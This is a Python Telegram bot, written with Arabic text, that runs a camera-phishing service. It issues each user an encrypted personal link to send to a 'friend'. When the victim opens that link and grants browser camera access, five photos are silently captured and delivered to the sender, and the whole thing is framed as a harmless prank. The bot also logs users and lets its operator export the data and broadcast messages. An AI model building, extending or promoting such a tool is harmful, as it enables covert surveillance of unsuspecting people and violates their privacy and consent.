import time
import threading
import io
import json
import glob
import os
from datetime import datetime, timedelta
from collections import defaultdict
import telebot
from telebot.types import BotCommand, BotCommandScopeDefault, BotCommandScopeChat, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from config import TOKEN, DEVELOPER_CHAT_ID, BASE_URL, logger, load_data, save_data
from encryption import encrypt_id

bot = telebot.TeleBot(TOKEN)

# تحميل البيانات
data = load_data()
user_stats = data.get("user_stats", {})
total_photos_received = data.get("total_photos_received", 0)

# تحديث وقت بدء البوت إذا كان أول مرة
if not data.get("first_start"):
    data["first_start"] = datetime.now().isoformat()
    save_data(data)

# قفل لمنع التزاحم في حفظ البيانات
data_lock = threading.Lock()

# تخزين آخر تحديث لملف البوت
last_profile_update = {'last_update': 0}

# تخزين أوامر المستخدمين للحد من السرعة
user_commands = defaultdict(list)

def parse_date(date_value):
    """تحويل التاريخ من نص إلى كائن datetime"""
    if isinstance(date_value, str):
        return datetime.fromisoformat(date_value)
    return date_value

def rate_limit(user_id, limit=5, period=60):
    """التحقق من عدم تجاوز حد الأوامر (5 أوامر في الدقيقة افتراضياً)"""
    now = datetime.now()
    user_commands[user_id] = [t for t in user_commands[user_id] if now - t < timedelta(seconds=period)]
    
    if len(user_commands[user_id]) >= limit:
        return False
    
    user_commands[user_id].append(now)
    return True

def backup_data():
    """إنشاء نسخة احتياطية تلقائية للبيانات"""
    try:
        backup_file = f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        import shutil
        shutil.copy('data.json', backup_file)
        logger.info(f"Backup created: {backup_file}")
        
        # الاحتفاظ بآخر 10 نسخ فقط
        backups = sorted(glob.glob('backup_*.json'))
        for old_backup in backups[:-10]:
            os.remove(old_backup)
            logger.info(f"Removed old backup: {old_backup}")
    except Exception as e:
        logger.error(f"Failed to create backup: {e}")

def save_user_data():
    """حفظ بيانات المستخدمين مع قفل لمنع التزاحم"""
    with data_lock:
        data["user_stats"] = user_stats
        data["total_photos_received"] = total_photos_received
        data["total_users"] = len(user_stats)
        save_data(data)

def setup_bot_commands():
    """إعداد قائمة الأوامر التي تظهر في مربع الكتابة"""
    try:
        # مسح الأوامر الحالية أولاً
        bot.delete_my_commands()
        
        # الأوامر العامة لجميع المستخدمين
        general_commands = [
            BotCommand("start", "🚀 بدء استخدام البوت"),
            BotCommand("stats", "📊 عرض إحصائياتك"),
            BotCommand("help", "❓ المساعدة والتعليمات")
        ]
        
        # تعيين الأوامر العامة للجميع
        bot.set_my_commands(general_commands, scope=BotCommandScopeDefault())
        
        # إضافة أوامر إضافية للمطور
        if DEVELOPER_CHAT_ID:
            developer_commands = [
                BotCommand("adminstats", "📈 إحصائيات البوت"),
                BotCommand("broadcast", "📢 إرسال رسالة للجميع"),
                BotCommand("userslist", "👥 قائمة المستخدمين"),
                BotCommand("exportdata", "📤 تصدير البيانات"),
                BotCommand("health", "🏥 حالة البوت")
            ]
            
            # تعيين الأوامر الخاصة للمطور
            bot.set_my_commands(developer_commands, scope=BotCommandScopeChat(chat_id=DEVELOPER_CHAT_ID))
        
        logger.info("Bot commands setup completed")
    except Exception as e:
        logger.error(f"Failed to setup bot commands: {e}")

def update_bot_profile(force=False):
    """تحديث اسم البوت ووصفه مع عدد المستخدمين ورابط القناة"""
    current_time = time.time()
    
    # تحديث كل 5 دقائق فقط ما لم يكن force=True
    if not force and current_time - last_profile_update.get('last_update', 0) < 300:
        return
    
    try:
        total_users = len(user_stats)
        
        # تحديث وصف البوت (البيو) مع إضافة رابط القناة
        bot.set_my_description(
            f"📸 بوت الكاميرا الذكية\n"
            f"👥 عدد المستخدمين: {total_users}\n"
            f"🖼️ إجمالي الصور: {total_photos_received}\n\n"
            f"✨ بوت متخصص بالتقاط 5 صور من الكاميرا وإرسالها إليك\n\n"
            f"📢 انضم إلى القناة لمتابعة كل جديد:\n"
            f"عالم البرمجيات | Software World\n"
            f"https://t.me/KhaldounSoft"
        )
        
        # تحديث النص القصير (about)
        bot.set_my_short_description(
            f"📸 بوت الكاميرا الذكية | {total_users} مستخدم | t.me/KhaldounSoft"
        )
        
        last_profile_update['last_update'] = current_time
        logger.info(f"Bot profile updated - Users: {total_users}")
    except Exception as e:
        logger.error(f"Failed to update bot profile: {e}")

def notify_developer(message_text, parse_mode="Markdown"):
    """إرسال إشعار للمطور"""
    try:
        bot.send_message(DEVELOPER_CHAT_ID, message_text, parse_mode=parse_mode)
    except Exception as e:
        logger.error(f"Failed to notify developer: {e}")

@bot.message_handler(commands=['start'])
def send_welcome(message):
    """رسالة الترحيب"""
    # التحقق من حد الأوامر
    if not rate_limit(message.chat.id):
        bot.reply_to(message, "⏰ أنت ترسل الأوامر بسرعة كبيرة، انتظر قليلاً")
        return
    
    user_id = message.chat.id
    user_name = message.from_user.first_name
    username = message.from_user.username or "لا يوجد"
    is_new_user = False

    # تسجيل المستخدم الجديد
    if user_id not in user_stats:
        is_new_user = True
        user_stats[user_id] = {
            "name": user_name,
            "username": username,
            "photo_count": 0,
            "first_seen": datetime.now().isoformat(),
            "last_active": datetime.now().isoformat(),
            "total_links_shared": 0
        }
        save_user_data()
        
        # تحديث ملف البوت بعد إضافة مستخدم جديد
        update_bot_profile()
        
        # إشعار للمطور بمستخدم جديد
        notify_message = (
            f"🆕 *مستخدم جديد!*\n\n"
            f"👤 الاسم: {user_name}\n"
            f"🆔 المعرف: `{user_id}`\n"
            f"📝 اليوزر: @{username}\n"
            f"📅 التاريخ: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"👥 إجمالي المستخدمين: {len(user_stats)}"
        )
        notify_developer(notify_message)
        
        # إنشاء نسخة احتياطية كل 10 مستخدمين جدد
        if len(user_stats) % 10 == 0:
            backup_data()
    else:
        user_stats[user_id]["last_active"] = datetime.now().isoformat()
        user_stats[user_id]["name"] = user_name
        user_stats[user_id]["username"] = username
        save_user_data()

    # تشفير الـ ID
    encrypted = encrypt_id(user_id)
    personal_link = f"{BASE_URL}?q={encrypted}"

    # زيادة عدد مشاركات الرابط
    user_stats[user_id]["total_links_shared"] = user_stats[user_id].get("total_links_shared", 0) + 1
    save_user_data()

    # إنشاء أزرار
    markup = InlineKeyboardMarkup(row_width=2)
    
    # زر نسخ الرابط
    copy_button = InlineKeyboardButton(text="📋 انسخ الرابط", callback_data=f"copy_{encrypted}")
    
    # زر انضمام للقناة
    channel_button = InlineKeyboardButton(text="📢 عالم البرمجيات", url="https://t.me/KhaldounSoft")
    
    # أزرار المساعدة والإحصائيات
    help_button = InlineKeyboardButton(text="❓ التعليمات", callback_data="help")
    stats_button = InlineKeyboardButton(text="📊 إحصائياتي", callback_data="stats")
    
    markup.add(copy_button)
    markup.add(channel_button)
    markup.add(help_button, stats_button)

    # عرض عدد المستخدمين الحالي
    total_users = len(user_stats)
    
    response = (
       f"🎉 أهلاً بك يا *{user_name}*!\n\n"
       f"👥 *عدد مستخدمي البوت:* {total_users} مستخدم\n\n"
       f"📸 *فكرة البوت (مزحة خفيفة مع صديقك):*\n"
       f"انسخ الرابط وارسله لصديقك، بمجرد أن يفتحه سيتم التقاط 5 صور وإرسالها إليك هنا في البوت مباشرة. لا يمكن لأي شخص آخر الوصول إليها لضمان الخصوصية 🔒\n\n"
       f"✨ *رابطك الشخصي جاهز:* \n"
       f"`{personal_link}`\n\n"
       f"📌 *خطوات الاستخدام:*\n"
       f"1️⃣ قم بنسخ الرابط أعلاه.\n"
       f"2️⃣ أرسله لصديقك في رسالة (أو جربه بنفسك).\n"
       f"3️⃣ سيبدأ البوت فوراً بإرسال الصور إليك.\n\n"
       f"🔒 *ملاحظة:* الرابط مشفر بالكامل، لا يمكن لأحد معرفة الرقم الأصلي.\n\n"
       f"📢 *تابعنا لمزيد من البوتات والبرامج:*\n"
       f"[عالم البرمجيات | Software World](https://t.me/KhaldounSoft)"
    )
    bot.send_message(user_id, response, parse_mode="Markdown", reply_markup=markup)
    logger.info(f"User started: {user_name} (ID: {user_id}) - New: {is_new_user}")

@bot.callback_query_handler(func=lambda call: call.data.startswith("copy_"))
def copy_link(call):
    """نسخ الرابط عند الضغط على الزر"""
    try:
        encrypted = call.data.replace("copy_", "")
        if not encrypted:
            raise ValueError("Empty encrypted data")
        
        personal_link = f"{BASE_URL}?q={encrypted}"
        
        # إجابة على الضغط
        bot.answer_callback_query(call.id, "📋 تم نسخ الرابط بنجاح!")
        
        # إرسال رسالة تحتوي على الرابط مع تعليمات
        bot.send_message(
            call.message.chat.id,
            f"📋 *رابطك الشخصي:*\n"
            f"`{personal_link}`\n\n"
            f"✅ يمكنك الآن مشاركة هذا الرابط مع أصدقائك لالتقاط الصور!\n",
            parse_mode="Markdown"
        )
    except Exception as e:
        logger.error(f"Error in copy_link: {e}")
        bot.answer_callback_query(call.id, "❌ حدث خطأ، حاول مرة أخرى")

@bot.message_handler(commands=['stats'])
def show_stats(message):
    """عرض الإحصائيات"""
    # التحقق من حد الأوامر
    if not rate_limit(message.chat.id):
        bot.reply_to(message, "⏰ أنت ترسل الأوامر بسرعة كبيرة، انتظر قليلاً")
        return
    
    user_id = message.chat.id
    if user_id in user_stats:
        stat = user_stats[user_id]
        # تحويل التواريخ باستخدام الدالة المساعدة
        first_seen = parse_date(stat['first_seen'])
        last_active = parse_date(stat['last_active'])
        
        total_users = len(user_stats)
        
        response = (
            f"📊 *إحصائياتك الشخصية*\n\n"
            f"👤 الاسم: {stat['name']}\n"
            f"🆔 رقمك: `{user_id}`\n"
            f"📸 عدد الصور المستلمة: {stat['photo_count']}\n"
            f"🔗 عدد مرات مشاركة رابطك: {stat.get('total_links_shared', 0)}\n"
            f"📅 تاريخ التسجيل: {first_seen.strftime('%Y-%m-%d %H:%M')}\n"
            f"🕐 آخر نشاط: {last_active.strftime('%Y-%m-%d %H:%M')}\n\n"
            f"🌐 *إحصائيات عامة:*\n"
            f"👥 عدد مستخدمي البوت: {total_users}\n"
            f"🖼️ إجمالي الصور: {total_photos_received}"
        )
    else:
        response = "❌ لم يتم العثور على إحصائيات لك. استخدم /start أولاً"
    bot.send_message(user_id, response, parse_mode="Markdown")

@bot.message_handler(commands=['adminstats'])
def admin_stats(message):
    """إحصائيات المطور (للمطور فقط)"""
    if message.chat.id != DEVELOPER_CHAT_ID:
        bot.reply_to(message, "❌ هذا الأمر للمطور فقط!")
        return
    
    # حساب إحصائيات إضافية
    total_users = len(user_stats)
    total_photos = total_photos_received
    
    # حساب المستخدمين النشطين اليوم
    today = datetime.now().replace(hour=0, minute=0, second=0, microsecond=0)
    week_ago = (datetime.now() - timedelta(days=7)).replace(hour=0, minute=0, second=0, microsecond=0)
    
    active_today = 0
    active_week = 0
    
    for u in user_stats.values():
        last_active = parse_date(u['last_active'])
        if last_active > today:
            active_today += 1
        if last_active > week_ago:
            active_week += 1
    
    # أكثر المستخدمين نشاطاً
    top_users = sorted(user_stats.items(), key=lambda x: x[1].get('photo_count', 0), reverse=True)[:5]
    top_users_text = ""
    for i, (uid, stat) in enumerate(top_users, 1):
        top_users_text += f"{i}. {stat['name']} - {stat.get('photo_count', 0)} صورة\n"
    
    # وقت بدء البوت
    first_start = parse_date(data.get("first_start", datetime.now().isoformat()))
    
    # قائمة الأوامر للمطور
    commands_list = (
        "📋 *قائمة الأوامر المتاحة للمطور:*\n\n"
        "• /start - بدء البوت\n"
        "• /stats - إحصائياتك الشخصية\n"
        "• /help - المساعدة\n"
        "• /adminstats - إحصائيات البوت الكاملة\n"
        "• /broadcast - إرسال رسالة للجميع\n"
        "• /userslist - عرض قائمة المستخدمين\n"
        "• /updateprofile - تحديث ملف البوت\n"
        "• /setphoto - تغيير صورة البوت\n"
        "• /exportdata - تصدير البيانات\n"
        "• /health - حالة البوت"
    )
    
    response = (
        f"📊 *إحصائيات البوت الكاملة*\n\n"
        f"👥 *إجمالي المستخدمين:* {total_users}\n"
        f"🖼️ *إجمالي الصور:* {total_photos}\n"
        f"⭐ *المستخدمين النشطين اليوم:* {active_today}\n"
        f"📅 *المستخدمين النشطين آخر 7 أيام:* {active_week}\n\n"
        f"🏆 *أكثر المستخدمين نشاطاً:*\n{top_users_text}\n"
        f"📅 *تاريخ بدء البوت:* {first_start.strftime('%Y-%m-%d %H:%M')}\n"
        f"🕐 *آخر تحديث:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
        f"{commands_list}"
    )
    bot.send_message(DEVELOPER_CHAT_ID, response, parse_mode="Markdown")

@bot.message_handler(commands=['userslist'])
def users_list(message):
    """عرض قائمة المستخدمين مع ترقيم الصفحات (للمطور فقط)"""
    if message.chat.id != DEVELOPER_CHAT_ID:
        bot.reply_to(message, "❌ هذا الأمر للمطور فقط!")
        return
    
    if not user_stats:
        bot.send_message(DEVELOPER_CHAT_ID, "📭 لا يوجد مستخدمين حتى الآن")
        return
    
    # إرسال الصفحة الأولى
    show_users_page(message, 0)

def show_users_page(message, page):
    """عرض صفحة محددة من قائمة المستخدمين"""
    PAGE_SIZE = 20
    users_list = list(user_stats.items())
    total_pages = (len(users_list) + PAGE_SIZE - 1) // PAGE_SIZE
    
    if page >= total_pages:
        page = 0
    
    start_idx = page * PAGE_SIZE
    end_idx = min(start_idx + PAGE_SIZE, len(users_list))
    
    users_text = f"👥 *قائمة المستخدمين (الصفحة {page+1}/{total_pages}):*\n\n"
    
    for uid, stat in users_list[start_idx:end_idx]:
        last_active = parse_date(stat['last_active'])
        users_text += f"• {stat['name']} (@{stat['username']})\n"
        users_text += f"  🆔 `{uid}` | 📸 {stat['photo_count']} | 🕐 {last_active.strftime('%Y-%m-%d')}\n\n"
    
    # إضافة أزرار التنقل
    markup = InlineKeyboardMarkup(row_width=2)
    nav_buttons = []
    
    if page > 0:
        nav_buttons.append(InlineKeyboardButton("⬅️ السابق", callback_data=f"users_page_{page-1}"))
    if page < total_pages - 1:
        nav_buttons.append(InlineKeyboardButton("التالي ➡️", callback_data=f"users_page_{page+1}"))
    
    if nav_buttons:
        markup.add(*nav_buttons)
    
    # إرسال النص مع الأزرار
    if isinstance(message, telebot.types.Message):
        bot.send_message(DEVELOPER_CHAT_ID, users_text, parse_mode="Markdown", reply_markup=markup if nav_buttons else None)
    else:
        bot.edit_message_text(users_text, DEVELOPER_CHAT_ID, message.message_id, parse_mode="Markdown", reply_markup=markup if nav_buttons else None)

@bot.callback_query_handler(func=lambda call: call.data.startswith("users_page_"))
def handle_users_page(call):
    """معالجة التنقل بين صفحات المستخدمين"""
    if call.message.chat.id != DEVELOPER_CHAT_ID:
        bot.answer_callback_query(call.id, "❌ هذا الأمر للمطور فقط!")
        return
    
    page = int(call.data.replace("users_page_", ""))
    show_users_page(call.message, page)
    bot.answer_callback_query(call.id)

@bot.message_handler(commands=['updateprofile'])
def update_profile(message):
    """تحديث ملف البوت (للمطور فقط)"""
    if message.chat.id != DEVELOPER_CHAT_ID:
        bot.reply_to(message, "❌ هذا الأمر للمطور فقط!")
        return
    
    update_bot_profile(force=True)
    bot.reply_to(message, "✅ تم تحديث ملف البوت بنجاح!")

@bot.message_handler(commands=['setphoto'])
def set_bot_photo(message):
    """تغيير صورة البوت (للمطور فقط)"""
    if message.chat.id != DEVELOPER_CHAT_ID:
        bot.reply_to(message, "❌ هذا الأمر للمطور فقط!")
        return
    
    if not message.reply_to_message or not message.reply_to_message.photo:
        bot.reply_to(message, "❌ قم بالرد على صورة مع الأمر /setphoto")
        return
    
    photo = message.reply_to_message.photo[-1]
    try:
        bot.set_chat_photo(photo.file_id)
        bot.reply_to(message, "✅ تم تغيير صورة البوت بنجاح!")
    except Exception as e:
        bot.reply_to(message, f"❌ فشل تغيير الصورة: {e}")

@bot.message_handler(commands=['help'])
def send_help(message):
    """رسالة المساعدة"""
    # التحقق من حد الأوامر
    if not rate_limit(message.chat.id):
        bot.reply_to(message, "⏰ أنت ترسل الأوامر بسرعة كبيرة، انتظر قليلاً")
        return
    
    user_id = message.chat.id
    total_users = len(user_stats)
    
    help_text = (
        f"📖 *دليل استخدام البوت*\n\n"
        f"👥 *عدد مستخدمي البوت:* {total_users}\n\n"
        f"🎯 *الأوامر المتاحة:*\n"
        f"✅ /start - الحصول على رابطك الشخصي\n"
        f"📊 /stats - عرض إحصائياتك\n"
        f"❓ /help - عرض هذه التعليمات\n\n"
        f"🔧 *كيف يعمل البوت:*\n"
        f"1. اضغط على /start للحصول على رابطك الشخصي\n"
        f"2. اضغط على زر \"انسخ الرابط\"\n"
        f"3. انسخ الرابط وافتحه في متصفح خارجي (Chrome/Safari)\n"
        f"4. اسمح بالوصول إلى الكاميرا\n"
        f"5. يتم التقاط 5 صور تلقائياً (صورة كل 2 ثانية)\n"
        f"6. تصل الصور إليك مباشرة في هذه المحادثة\n\n"
        f"⚠️ *ملاحظات هامة:*\n"
        f"• ❌ لا تفتح الرابط من داخل تليجرام - الكاميرا لن تعمل!\n"
        f"• ✅ يجب فتح الرابط في متصفح خارجي فقط\n"
        f"• البوت يأخذ 5 صور فقط ثم يتوقف\n"
        f"• يمكن إعادة فتح الرابط لالتقاط المزيد\n"
        f"• الصور تصل فقط لصاحب الرابط\n\n"
        f"📢 *تابعنا على القناة:* https://t.me/KhaldounSoft\n"
        f"🛠️ للمساعدة التقنية: @khaled_developer"
    )
    
    # إضافة الأوامر الإضافية للمطور
    if user_id == DEVELOPER_CHAT_ID:
        help_text += (
            f"\n\n👨‍💻 *أوامر المطور:*\n"
            f"📈 /adminstats - إحصائيات البوت الكاملة\n"
            f"📢 /broadcast - إرسال رسالة للجميع\n"
            f"👥 /userslist - عرض قائمة المستخدمين\n"
            f"🔄 /updateprofile - تحديث ملف البوت\n"
            f"🖼️ /setphoto - تغيير صورة البوت\n"
            f"📤 /exportdata - تصدير البيانات\n"
            f"🏥 /health - حالة البوت"
        )
    
    bot.send_message(user_id, help_text, parse_mode="Markdown")

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    """إرسال رسالة لجميع المستخدمين (للمطور فقط)"""
    if message.chat.id != DEVELOPER_CHAT_ID:
        bot.reply_to(message, "❌ هذا الأمر للمطور فقط!")
        return

    parts = message.text.split(' ', 1)
    if len(parts) < 2:
        bot.reply_to(message, "❌ استخدم:\n/broadcast نص الرسالة")
        return
    
    if not user_stats:
        bot.reply_to(message, "❌ لا يوجد مستخدمين للبث")
        return

    broadcast_text = parts[1]
    success, fail = 0, 0
    failed_users = []
    
    # إرسال تأكيد بدء البث
    status_msg = bot.reply_to(message, "🔄 جاري إرسال الرسائل...")
    
    for uid in user_stats.keys():
        try:
            bot.send_message(uid, f"📢 *إشعار من المطور:*\n\n{broadcast_text}", parse_mode="Markdown")
            success += 1
            time.sleep(0.1)  # تجنب الحظر من تليجرام
        except Exception as e:
            logger.error(f"Failed to send to {uid}: {e}")
            fail += 1
            failed_users.append(uid)
    
    # تحديث رسالة الحالة
    result_text = f"✅ تم البث!\n✓ نجح: {success}\n✗ فشل: {fail}"
    if failed_users:
        result_text += f"\n\n❌ المستخدمون الفاشلون:\n{', '.join(map(str, failed_users[:10]))}"
        if len(failed_users) > 10:
            result_text += f"\n...و {len(failed_users) - 10} آخرين"
    
    bot.edit_message_text(result_text, DEVELOPER_CHAT_ID, status_msg.message_id, parse_mode="Markdown")
    
    # إشعار للمطور بنتيجة البث
    notify_developer(f"📢 *نتيجة البث*\n\n✓ نجح: {success}\n✗ فشل: {fail}")

@bot.message_handler(commands=['health'])
def health_check(message):
    """فحص حالة البوت (للمطور فقط)"""
    if message.chat.id != DEVELOPER_CHAT_ID:
        return
    
    uptime = datetime.now() - parse_date(data.get("first_start", datetime.now().isoformat()))
    uptime_days = uptime.days
    uptime_hours = uptime.seconds // 3600
    uptime_minutes = (uptime.seconds % 3600) // 60
    
    health_status = (
        f"🏥 *حالة البوت*\n\n"
        f"✅ *الحالة:* يعمل بشكل طبيعي\n"
        f"👥 *المستخدمين:* {len(user_stats)}\n"
        f"🖼️ *الصور:* {total_photos_received}\n"
        f"⏱️ *مدة التشغيل:* {uptime_days} يوم, {uptime_hours} ساعة, {uptime_minutes} دقيقة\n"
        f"📅 *آخر تحديث:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )
    
    bot.reply_to(message, health_status, parse_mode="Markdown")

@bot.message_handler(content_types=['photo'])
def handle_photos(message):
    """معالجة الصور الواردة"""
    global total_photos_received
    user_id = message.chat.id
    user_name = message.from_user.first_name
    username = message.from_user.username or "لا يوجد"

    if user_id in user_stats:
        user_stats[user_id]["photo_count"] += 1
        user_stats[user_id]["last_active"] = datetime.now().isoformat()
    else:
        user_stats[user_id] = {
            "name": user_name,
            "username": username,
            "photo_count": 1,
            "first_seen": datetime.now().isoformat(),
            "last_active": datetime.now().isoformat(),
            "total_links_shared": 0
        }
        save_user_data()
    
    total_photos_received += 1
    save_user_data()
    
    # تحديث ملف البوت بعد تغير عدد الصور
    update_bot_profile()

    photo = message.photo[-1]
    file_info = bot.get_file(photo.file_id)
    file_size = file_info.file_size / 1024

    caption = (
        f"✅ تم استلام صورة جديدة!\n\n"
        f"👤 من: {user_name}\n"
        f"🆔 المعرف: `{user_id}`\n"
        f"📝 اليوزر: @{username}\n"
        f"📏 الحجم: {file_size:.1f} كيلوبايت\n"
        f"🖼️ إجمالي صورك: {user_stats[user_id]['photo_count']}\n"
        f"📊 الإجمالي الكلي: {total_photos_received}"
    )
    bot.reply_to(message, caption)
    logger.info(f"Received photo from {user_name} (ID: {user_id})")

@bot.message_handler(commands=['exportdata'])
def export_data(message):
    """تصدير البيانات (للمطور فقط)"""
    if message.chat.id != DEVELOPER_CHAT_ID:
        bot.reply_to(message, "❌ هذا الأمر للمطور فقط!")
        return
    
    try:
        export_data_dict = {
            "export_date": datetime.now().isoformat(),
            "total_users": len(user_stats),
            "total_photos": total_photos_received,
            "user_stats": user_stats,
            "first_start": data.get("first_start")
        }
        
        file = io.BytesIO(json.dumps(export_data_dict, ensure_ascii=False, indent=2).encode('utf-8'))
        file.name = f"bot_data_export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        bot.send_document(DEVELOPER_CHAT_ID, file, caption="📊 تصدير بيانات البوت")
        logger.info("Data exported successfully")
    except Exception as e:
        logger.error(f"Failed to export data: {e}")
        bot.reply_to(message, f"❌ فشل تصدير البيانات: {e}")

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    """معالجة الأزرار الأخرى"""
    try:
        if call.data == "help":
            # إنشاء رسالة مساعدة جديدة
            help_msg = bot.send_message(call.message.chat.id, "جاري تحميل المساعدة...")
            send_help(help_msg)
        elif call.data == "stats":
            # إنشاء رسالة إحصائيات جديدة
            stats_msg = bot.send_message(call.message.chat.id, "جاري تحميل الإحصائيات...")
            show_stats(stats_msg)
        bot.answer_callback_query(call.id)
    except Exception as e:
        logger.error(f"Error in callback handler: {e}")
        bot.answer_callback_query(call.id, "❌ حدث خطأ")

@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    """معالجة الرسائل الأخرى"""
    # التحقق من حد الأوامر للرسائل العادية
    if not rate_limit(message.chat.id, limit=10, period=60):
        bot.reply_to(message, "⏰ أنت ترسل الرسائل بسرعة كبيرة، انتظر قليلاً")
        return
    
    if message.text and message.text.startswith('/'):
        bot.reply_to(message, "❌ أمر غير معروف!\n\n✅ الأوامر المتاحة:\n/start - للحصول على رابطك\n/stats - لعرض إحصائياتك\n/help - للتعليمات والمساعدة")
    else:
        bot.reply_to(message, f"مرحباً {message.from_user.first_name}! 👋\n\nاستخدم /start للحصول على رابطك الشخصي.\n\nيمكنك أيضاً الضغط على القائمة (Menu) في مربع الكتابة لرؤية الأوامر المتاحة.")

def get_bot():
    """إرجاع كائن البوت والإحصائيات"""
    return bot, user_stats, total_photos_received

# تشغيل البوت
if __name__ == "__main__":
    setup_bot_commands()
    update_bot_profile(force=True)
    logger.info("Bot started successfully!")
    
    # إنشاء نسخة احتياطية أولية
    backup_data()
    
    try:
        bot.infinity_polling(timeout=60, long_polling_timeout=60)
    except Exception as e:
        logger.error(f"Bot polling error: {e}")
        # إعادة التشغيل في حالة الخطأ
        time.sleep(10)
        logger.info("Restarting bot...")
        bot.infinity_polling(timeout=60, long_polling_timeout=60)
